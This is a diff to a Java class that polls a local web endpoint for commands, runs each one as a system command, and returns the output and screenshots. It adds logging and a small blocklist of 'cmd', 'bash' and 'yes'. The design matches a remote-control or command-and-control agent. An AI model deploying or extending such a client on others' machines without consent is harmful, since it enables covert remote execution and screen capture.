@@ -4,9 +4,12 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 public class CommandReciver {
 
+    final Logger log = LoggerFactory.getLogger(CommandReciver.class);
 
     private String url = "http://localhost:8080/command";
     private WebHandler webHandler;
@@ -29,18 +32,33 @@ public class CommandReciver {
 
     public void readCommands() {
         try {
-            String left = webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0];
+            String left = webHandler.getContent().split("id=\"commands\">\n")[1].split("</pre>")[0];
 
             String[] commands = left.replace("\\r", "").split("\\n");
             for (String command : commands) {
                 try {
-                    if (command.equals("screenshot")) {
-                        Screenshot.takeScreenshot();
-                    } else {
-                        for (String out : execute(command)) {
-                            new Sender().send("commandout", out);
-                        }
+                    switch (command.toLowerCase()) {
+                        case "screenshot":
+                            sender.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
+                            break;
+                        case "cmd":
+                        case "bash":
+                        case "yes":
+                            sender.send("error", "Command '" + command + "' not allowed");
+                            break;
+                        default:
+                            try {
+                                if (!command.equals("")) {
+                                    for (String out : execute(command)) {
+                                        sender.send("commandout", out);
+                                    }
+                                }
+                            } catch (NullPointerException e) {
+                                sender.send("errorout", "No command '" + command + "' found");
+                            }
+                            break;
                     }
+
                 } catch (NullPointerException e) {
                     e.printStackTrace();
                 }
@@ -52,7 +70,7 @@ public class CommandReciver {
 
 
     public ArrayList<String> execute(String command) {
-        System.out.println("-" + command);
+        log.info(System.getProperty("user.dir") + " $ " + command);
 
         ArrayList<String> output = new ArrayList<>();
         try {
@@ -63,20 +81,20 @@ public class CommandReciver {
             BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
             BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
 
-            output.add(ConsoleColor.BLUE.getColor() + System.getProperty("user.dir") + " $ "
-                       + ConsoleColor.CYAN_BRIGHT.getColor() + command);
+            output.add(System.getProperty("user.dir") + " $ " + command);
 
             String s;
             while ((s = stdInput.readLine()) != null) {
-                output.add(ConsoleColor.GREEN.getColor() + s);
+                log.info(s);
+                output.add(s);
             }
 
             while ((s = stdError.readLine()) != null) {
-                output.add(ConsoleColor.RED.getColor() + s);
+                log.info(s);
+                output.add(s);
             }
-        } catch (IOException ignored) {
-            output.add(ConsoleColor.RED.getColor() + command + " failed");
-            return output;
+        } catch (IOException e) {
+            return null;
         }
         return output;
     }
